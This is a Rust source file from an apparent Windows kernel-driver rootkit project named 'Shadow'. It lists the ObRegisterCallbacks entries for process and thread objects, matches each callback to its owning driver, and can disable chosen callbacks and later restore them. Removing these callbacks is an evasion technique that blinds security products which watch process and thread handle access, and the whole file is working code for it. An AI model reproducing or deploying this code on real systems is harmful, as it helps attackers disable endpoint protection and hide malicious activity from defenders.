use {
    alloc::vec::Vec,
    spin::{Lazy, Mutex},
    ntapi::ntldr::LDR_DATA_TABLE_ENTRY, 
    wdk_sys::{NTSTATUS, STATUS_SUCCESS,}
};

use {
    common::{
        enums::Callbacks,
        structs::CallbackInfoOutput,
    },
    crate::{
        error::ShadowError, list_modules,
        lock::with_push_lock_exclusive,
        data::{CallbackRestaureOb, OBCALLBACK_ENTRY},
        callback::find_callback::{find_callback_address, CallbackResult}, 
    },
};

/// Structure representing the Callback Object.
pub struct CallbackOb;

const MAX_CALLBACK: usize = 100;

/// Stores information about removed callbacks.
///
/// This static variable holds a list of callbacks that were removed and are protected by a `Mutex`
/// to ensure thread-safe access. It is initialized with a capacity of `MAX_CALLBACK`.
static mut INFO_CALLBACK_RESTAURE_OB: Lazy<Mutex<Vec<CallbackRestaureOb>>> = Lazy::new(|| 
    Mutex::new(Vec::with_capacity(MAX_CALLBACK))
);

/// Implement a feature for the callback ObRegisterCallbacks (PsProcessType / PsThreadType).
impl CallbackOb {
    /// Restores a previously removed callback by its index.
    ///
    /// # Arguments
    ///
    /// * `callback` - The type of callback to be restored (e.g., process, thread, registry).
    /// * `index` - The index of the callback to restore.
    ///
    /// # Returns
    ///
    /// * `Ok(STATUS_SUCCESS)` - A success state if the callback is successfully restored.
    /// * `Err(ShadowError)` - A specific error if the callback cannot be restored.
    pub unsafe fn restore(callback: Callbacks, index: usize) -> Result<NTSTATUS, ShadowError> {
        // Lock the removed callbacks to ensure thread-safe access
        let mut callbacks = INFO_CALLBACK_RESTAURE_OB.lock();
        
        // Find the callback by its index
        let index = callbacks
            .iter()
            .position(|c| c.callback == callback && c.index == index)
            .ok_or(ShadowError::IndexNotFound(index))?;

        // Retrieve the callback address based on the callback type
        let full_object = match find_callback_address(&callback)? {
            CallbackResult::Object(addr) => addr,
            _ => return Err(ShadowError::CallbackNotFound),
        };

        // Acquire exclusive access to the TypeLock associated with the callback object
        let lock = &(*full_object).TypeLock as *const _ as *mut u64;
        with_push_lock_exclusive(lock, || {
            let current = &mut ((*full_object).CallbackList) as *mut _ as *mut OBCALLBACK_ENTRY;
            let mut next = (*current).CallbackList.Flink as *mut OBCALLBACK_ENTRY;

            // Traverse the list of callback entries to find the one matching the removed entry
            while next != current {
                if !(*next).Enabled && !next.is_null() && (*next).Entry as u64 == callbacks[index].entry {
                    
                    // Re-enable the callback and remove it from the removed list
                    (*next).Enabled = true;
                    callbacks.remove(index);

                    return Ok(STATUS_SUCCESS);
                }

                next = (*next).CallbackList.Flink as *mut OBCALLBACK_ENTRY;
            }    

            Err(ShadowError::RestoringFailureCallback)
        })
    }

    /// Removes a callback from a notification routine.
    ///
    /// # Arguments
    ///
    /// * `callback` - The type of callback to remove.
    /// * `index` - The index of the callback to remove.
    ///
    /// # Returns
    ///
    /// * `Ok(STATUS_SUCCESS)` - if the callback is successfully removed.
    /// * `Err(ShadowError)` - if the callback address cannot be found.
    pub unsafe fn remove(callback: Callbacks, index: usize) -> Result<NTSTATUS, ShadowError> {
        // Retrieve the callback address based on the callback type
        let full_object = match find_callback_address(&callback)? {
            CallbackResult::Object(addr) => addr,
            _ => return Err(ShadowError::CallbackNotFound),
        };

        // Acquire exclusive access to the TypeLock associated with the callback object
        let lock = &(*full_object).TypeLock as *const _ as *mut u64;
        with_push_lock_exclusive(lock, || {
            let mut i = 0;
            let current = &mut ((*full_object).CallbackList) as *mut _ as *mut OBCALLBACK_ENTRY;
            let mut next = (*current).CallbackList.Flink as *mut OBCALLBACK_ENTRY;
            let mut callback_info = INFO_CALLBACK_RESTAURE_OB.lock();
    
            // Traverse the list of callback entries
            while next != current {
                if i == index {
                    if (*next).Enabled {
                        // Store the removed callback in the list of removed callbacks
                        let callback_restaure = CallbackRestaureOb {
                            index,
                            callback,
                            entry: (*next).Entry as u64,
                            pre_operation: (*next).PreOperation.map_or(0u64, |pre_op| pre_op as u64),
                            post_operation: (*next).PostOperation.map_or(0u64, |post_op| post_op as u64)
                        };
    
                        // Disable the callback
                        (*next).Enabled = false;
                        callback_info.push(callback_restaure);
                    }

                    return Ok(STATUS_SUCCESS);
                }
    
                // Move to the next entry in the callback list
                next = (*next).CallbackList.Flink as *mut OBCALLBACK_ENTRY;
                i += 1;
            }

            Err(ShadowError::RemoveFailureCallback)    
        })
    }
}

/// Methods related to callback enumeration
impl CallbackOb {
    /// Enumerates the modules associated with callbacks and populates callback information.
    ///
    /// # Arguments
    ///
    /// * `callback` - The type of callback to enumerate.
    ///
    /// # Returns
    ///
    /// * `Ok(Vec<CallbackInfoOutput>)` - containing the list of callbacks.
    /// * `Err(ShadowError)` - if the callback cannot be found.
    pub unsafe fn enumerate(callback: Callbacks) -> Result<Vec<CallbackInfoOutput>, ShadowError> {
        let mut callbacks: Vec<CallbackInfoOutput> = Vec::new();
       
        // Retrieve the callback address based on the callback type
        let full_object = match find_callback_address(&callback)? {
            CallbackResult::Object(addr) => addr,
            _ => return Err(ShadowError::CallbackNotFound),
        };

        let current = &mut ((*full_object).CallbackList) as *mut _ as *mut OBCALLBACK_ENTRY;
        let mut next = (*current).CallbackList.Flink as *mut OBCALLBACK_ENTRY;
        let mut list_objects = Vec::new();
        
        // Collect the information about each callback
        while next != current {
            let pre_op_addr = (*next).PreOperation.map_or(0u64, |pre_op| pre_op as u64);
            let post_op_addr = (*next).PostOperation.map_or(0u64, |post_op| post_op as u64);

            list_objects.push(((*next).Enabled, (pre_op_addr, post_op_addr)));
            next = (*next).CallbackList.Flink as *mut OBCALLBACK_ENTRY;
        }

        // Iterate over loaded modules to find the module corresponding to each callback
        let (mut ldr_data, module_count) = list_modules()?;
        let start_entry = ldr_data;
        let mut current_index = 0;

        for (i, (enabled, addrs)) in list_objects.iter().enumerate() {
            if !enabled {
                current_index += 1;
                continue;
            }

            for _ in 0..module_count {
                let start_address = (*ldr_data).DllBase;
                let end_address = start_address as u64 + (*ldr_data).SizeOfImage as u64;
                let pre_operation = addrs.0;
                let post_operation = addrs.1;

                // Check if the callback addresses fall within the module's memory range
                if pre_operation > start_address as u64 && pre_operation < end_address || 
                    post_operation > start_address as u64 && post_operation < end_address
                {
                    let buffer = core::slice::from_raw_parts(
                        (*ldr_data).BaseDllName.Buffer,
                        ((*ldr_data).BaseDllName.Length / 2) as usize,
                    );    

                    // Store the callback information
                    let mut name = [0u16; 256];
                    let length = core::cmp::min(buffer.len(), 255);
                    name[..length].copy_from_slice(&buffer[..length]);

                    callbacks.push(CallbackInfoOutput {
                        index: current_index,
                        name,
                        pre_operation: pre_operation as usize,
                        post_operation: post_operation as usize,
                        address: 0
                    });

                    current_index += 1;
                    break;
                }

                // Move to the next module
                ldr_data = (*ldr_data).InLoadOrderLinks.Flink as *mut LDR_DATA_TABLE_ENTRY;
            }

            // Reset ldr_data for the next callback
            ldr_data = start_entry;
        }

        Ok(callbacks)
    }
    
    /// Enumerates all removed callbacks and provides detailed information.
    ///
    /// # Returns
    ///
    /// * `Ok(Vec<CallbackInfoOutput>)` - containing the list of removed callbacks.
    /// * `Err(ShadowError)` - if the operation fails.
    pub unsafe fn enumerate_removed() -> Result<Vec<CallbackInfoOutput>, ShadowError> {
        let mut callbacks: Vec<CallbackInfoOutput> = Vec::new();
        
        let callbacks_removed = INFO_CALLBACK_RESTAURE_OB.lock();
        let (mut ldr_data, module_count) = list_modules()?;
        let start_entry = ldr_data;

        // Iterate over the removed callbacks
        for (i, callback) in callbacks_removed.iter().enumerate() {
            for _ in 0..module_count {
                let start_address = (*ldr_data).DllBase;
                let image_size = (*ldr_data).SizeOfImage;
                let end_address = start_address as u64 + image_size as u64;

                // Check if the callback addresses fall within the module's memory range
                if callback.pre_operation > start_address as u64 && callback.pre_operation < end_address 
                    || callback.post_operation > start_address as u64 && callback.post_operation < end_address 
                {
                    let buffer = core::slice::from_raw_parts(
                        (*ldr_data).BaseDllName.Buffer,
                        ((*ldr_data).BaseDllName.Length / 2) as usize,
                    );
                    
                    // Store the removed callback information
                    let mut name = [0u16; 256];
                    let length = core::cmp::min(buffer.len(), 255);
                    name[..length].copy_from_slice(&buffer[..length]);

                    callbacks.push(CallbackInfoOutput {
                        index: callback.index as u8,
                        name,
                        pre_operation: callback.pre_operation as usize,
                        post_operation: callback.post_operation as usize,
                        address: 0
                    });

                    break;
                }                
                
                // Move to the next module
                ldr_data = (*ldr_data).InLoadOrderLinks.Flink as *mut LDR_DATA_TABLE_ENTRY;
            }

            // Reset the module list pointer for the next callback
            ldr_data = start_entry;
        }

        Ok(callbacks)
    }
}